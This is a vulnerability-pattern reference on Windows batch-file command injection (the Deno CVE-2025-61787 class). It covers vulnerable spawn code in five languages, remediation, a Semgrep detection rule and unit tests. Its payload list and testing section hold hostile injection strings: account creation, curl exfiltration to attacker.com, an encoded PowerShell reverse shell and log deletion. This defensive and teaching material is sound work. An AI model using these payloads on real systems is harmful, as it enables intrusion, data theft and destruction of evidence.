# Batch File Command Injection (Windows)

## Pattern Overview

| Attribute | Value |
|-----------|-------|
| **Pattern Class** | `injection/batch-file-command` |
| **Severity** | HIGH |
| **Score** | 8/10 |
| **CVSS** | 8.1 |
| **CWE** | CWE-78 (OS Command Injection) |
| **Languages** | JavaScript/TypeScript (Deno, Node.js), Rust, Go, Python, any language spawning processes on Windows |
| **Source CVE** | CVE-2025-61787 (Deno) |
| **Status** | Patched in Deno 2.2.15, 2.5.2+ |

## Description

On Windows, when an application spawns a batch file (`.bat` or `.cmd`), the Windows API implicitly routes execution through `cmd.exe`, regardless of how the application specifies the command. This implicit shell invocation means that special characters in arguments (particularly `&`, `|`, `>`, `<`) are interpreted as shell metacharacters, enabling command injection.

Even when developers explicitly spawn a batch file without requesting a shell, Windows's `CreateProcess()` API detects the batch file extension and invokes `cmd.exe` to interpret it. This behavior is not obvious and leads to command injection vulnerabilities.

## Technical Details

### Root Cause

From the Deno security advisory:
> "When Deno spawns batch files (`.bat`, `.cmd`), Windows automatically routes execution through `cmd.exe`, even if developers invoke the batch file directly."

The Windows `CreateProcess()` API has special handling for `.bat` and `.cmd` files:
1. Application calls `CreateProcess("script.bat", args)`
2. Windows detects `.bat` extension
3. Windows implicitly invokes: `cmd.exe /c "script.bat" args`
4. `cmd.exe` interprets metacharacters in args

### Command Injection Metacharacters

| Character | Effect in cmd.exe |
|-----------|-------------------|
| `&` | Command separator (run next command) |
| `&&` | Conditional AND (run if previous succeeded) |
| `\|\|` | Conditional OR (run if previous failed) |
| `\|` | Pipe output to next command |
| `>` | Redirect output to file |
| `>>` | Append output to file |
| `<` | Redirect input from file |
| `^` | Escape character |
| `%` | Variable expansion |
| `!` | Delayed variable expansion |

### Vulnerable Code Patterns

#### Deno (CVE-2025-61787)

```typescript
// VULNERABLE: User input in batch file arguments
const userInput = Deno.args[0];  // Could be "&calc.exe"

const command = new Deno.Command('./build.bat', {
    args: [userInput],
});
const child = command.spawn();

// Attack: userInput = "&calc.exe"
// Executed: cmd.exe /c "build.bat" &calc.exe
// Result: build.bat runs, THEN calc.exe runs
```

#### Node.js

```javascript
const { spawn, exec } = require('child_process');

// VULNERABLE: spawn with batch file
const userArg = req.query.arg;  // "&whoami > output.txt"
spawn('./script.bat', [userArg]);
// Interpreted by cmd.exe, command injection occurs

// VULNERABLE: Even with shell: false, batch files use cmd.exe
spawn('./script.bat', [userArg], { shell: false });
// Still vulnerable! Windows ignores shell: false for .bat files
```

#### Python

```python
import subprocess

# VULNERABLE: Running batch file with user input
user_input = request.args.get('cmd')  # "&type C:\\secrets.txt"
subprocess.run(['script.bat', user_input])
# Windows routes through cmd.exe, injection occurs
```

#### Go

```go
// VULNERABLE: exec.Command with batch file
userArg := r.URL.Query().Get("arg")  // "&net user hacker P@ss /add"
cmd := exec.Command("script.bat", userArg)
cmd.Run()
// Windows invokes cmd.exe, injection occurs
```

#### Rust

```rust
// VULNERABLE: std::process::Command with batch file
let user_arg = get_user_input();  // "&shutdown /s"
Command::new("script.bat")
    .arg(user_arg)
    .spawn()?;
// Windows routes through cmd.exe
```

### Attack Payloads

```bash
# Basic command execution
&calc.exe
&whoami
&net user hacker Password123! /add

# Data exfiltration
&type C:\Users\Admin\secrets.txt > C:\inetpub\wwwroot\leak.txt
&curl http://attacker.com/?data=%USERNAME%

# Reverse shell
&powershell -e JABjAGwAaQBlAG4AdAAg...

# File operations
&copy C:\important.db C:\public\stolen.db
&del /f /q C:\logs\*.log

# Chained commands
&echo pwned > C:\pwned.txt && whoami >> C:\pwned.txt

# With escaping
^&calc.exe  # If single & is filtered
```

### Why shell: false Doesn't Help

```javascript
// Developer thinks this is safe
spawn('./script.bat', [userInput], {
    shell: false,  // "Don't use a shell"
    windowsVerbatimArguments: true
});

// But Windows still uses cmd.exe for .bat files!
// The shell: false option is ignored for batch files
```

## Detection

### Semgrep Rule Approach

```yaml
rules:
  - id: batch-file-command-injection
    patterns:
      - pattern-either:
          # Deno
          - pattern: new Deno.Command($BAT, { args: [$USER_INPUT, ...] })
          - pattern: Deno.run({ cmd: [$BAT, $USER_INPUT, ...] })
          # Node.js
          - pattern: spawn($BAT, [$USER_INPUT, ...])
          - pattern: spawnSync($BAT, [$USER_INPUT, ...])
          - pattern: execFile($BAT, [$USER_INPUT, ...])
          - pattern: child_process.spawn($BAT, [$USER_INPUT, ...])
      - metavariable-regex:
          metavariable: $BAT
          regex: ".*\\.(bat|cmd)['\"]?$"
    message: >
      Batch file spawned with user-controlled arguments. On Windows, batch files
      are always executed through cmd.exe, enabling command injection via
      metacharacters (&, |, >, <). Sanitize or reject special characters.
    languages: [javascript, typescript]
    severity: ERROR

  - id: batch-file-spawn-audit
    patterns:
      - pattern-either:
          - pattern: spawn($CMD, ...)
          - pattern: exec($CMD, ...)
          - pattern: Deno.Command($CMD, ...)
      - metavariable-regex:
          metavariable: $CMD
          regex: ".*\\.(bat|cmd)['\"]?$"
    message: "Batch file execution detected - review for command injection on Windows"
    languages: [javascript, typescript]
    severity: WARNING
```

### Manual Code Review

Look for:
1. Process spawning of `.bat` or `.cmd` files
2. User input passed as arguments to batch files
3. Assumptions that `shell: false` prevents injection
4. Windows-targeted or cross-platform applications

### Dynamic Testing

```bash
# Test for command injection
curl "https://target.com/build?arg=%26calc.exe"
curl "https://target.com/build?arg=%26whoami"
curl "https://target.com/build?arg=%26echo%20pwned"

# Check for blind injection
curl "https://target.com/build?arg=%26ping%20attacker.com"
# Monitor for DNS/ICMP from target
```

## Remediation

### Option 1: Avoid Batch Files

```javascript
// Instead of calling a batch file, use native APIs or scripts
// that don't trigger cmd.exe

// Bad: spawn('./build.bat', [userInput])
// Good: Rewrite build.bat logic in JavaScript/Node.js
```

### Option 2: Strict Input Validation

```javascript
// Allowlist approach - only allow safe characters
function sanitizeArg(arg) {
    // Only allow alphanumeric, dash, underscore, dot
    if (!/^[a-zA-Z0-9_\-\.]+$/.test(arg)) {
        throw new Error('Invalid argument');
    }
    return arg;
}

// Usage
const safeArg = sanitizeArg(userInput);
spawn('./script.bat', [safeArg]);
```

### Option 3: Escape Metacharacters

```javascript
// Escape cmd.exe metacharacters
function escapeCmdArg(arg) {
    // Escape special characters with ^
    return arg.replace(/([&|<>^%!])/g, '^$1');
}

// Note: This is fragile and may not cover all cases
// Prefer allowlist validation instead
```

### Option 4: Use PowerShell with Proper Escaping

```javascript
// PowerShell has different escaping rules and is generally safer
// But still requires proper argument handling

const { spawn } = require('child_process');

// Use PowerShell instead of cmd.exe
spawn('powershell.exe', [
    '-NoProfile',
    '-ExecutionPolicy', 'Bypass',
    '-File', './script.ps1',
    '-Arg', userInput  // PowerShell handles this differently
], { shell: false });
```

### Option 5: Wrapper Script Validation

```batch
@echo off
REM build.bat - validate arguments before use

REM Check for dangerous characters
echo %1 | findstr /R "[&|<>^%%!]" >nul
if %errorlevel%==0 (
    echo Error: Invalid characters in argument
    exit /b 1
)

REM Proceed with safe argument
call actual-build.bat %1
```

### Platform-Aware Code

```javascript
const isWindows = process.platform === 'win32';

function runBuildScript(arg) {
    if (isWindows) {
        // On Windows, validate strictly or use alternative
        if (!/^[a-zA-Z0-9_\-\.]+$/.test(arg)) {
            throw new Error('Invalid argument for Windows');
        }
        spawn('./build.bat', [arg]);
    } else {
        // On Unix, still validate but different concerns
        spawn('./build.sh', [arg]);
    }
}
```

## Testing

### Unit Tests

```javascript
describe('Batch File Argument Sanitization', () => {
    const maliciousInputs = [
        '&calc.exe',
        '&&whoami',
        '|net user',
        '>output.txt',
        '<input.txt',
        '%USERNAME%',
        '!variable!',
        '^escape',
        'normal&malicious',
    ];

    maliciousInputs.forEach(input => {
        it(`should reject: ${input}`, () => {
            expect(() => sanitizeArg(input)).toThrow();
        });
    });

    const safeInputs = [
        'build',
        'release-v1.0.0',
        'my_project',
        'file.txt',
    ];

    safeInputs.forEach(input => {
        it(`should allow: ${input}`, () => {
            expect(sanitizeArg(input)).toBe(input);
        });
    });
});
```

### Integration Tests

```javascript
// Test on Windows specifically
if (process.platform === 'win32') {
    it('should not execute injected commands', async () => {
        const markerFile = 'C:\\temp\\injection-test.txt';

        // Clean up any existing marker
        try { fs.unlinkSync(markerFile); } catch {}

        // Attempt injection
        await runBuildScript('&echo pwned > ' + markerFile);

        // Verify injection didn't work
        expect(fs.existsSync(markerFile)).toBe(false);
    });
}
```

## Real-World Context

### Why This Pattern Matters

1. **Cross-platform applications**: Developers test on Unix where this isn't an issue, then deploy to Windows
2. **Build tools**: Many CI/CD systems use batch files for Windows builds
3. **Installers**: Windows installers often invoke batch scripts
4. **Legacy integration**: Batch files wrap older Windows tools

### Attack Scenarios

1. **CI/CD Pipeline**: Attacker controls a build parameter that's passed to a build script
2. **Web Application**: User-controlled filename or argument passed to a Windows tool
3. **Electron App**: Desktop app spawns batch files with user input
4. **API Gateway**: Backend spawns scripts to process requests

## References

- [SecurityOnline: CVE-2025-61787 Deno Command Injection](https://securityonline.info/high-severity-deno-flaw-cve-2025-61787-allows-command-injection-on-windows/)
- [Deno Security Advisory](https://github.com/denoland/deno/security/advisories)
- [Node.js child_process Security](https://nodejs.org/api/child_process.html#spawning-bat-and-cmd-files-on-windows)
- [Microsoft CreateProcess Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

## Related Patterns

- `injection/command-shell` - General shell command injection
- `injection/argument-injection` - Injecting arguments to executables
- `injection/environment-variable` - Injection via environment variables
- `traversal/windows-device-names` - Windows-specific path issues
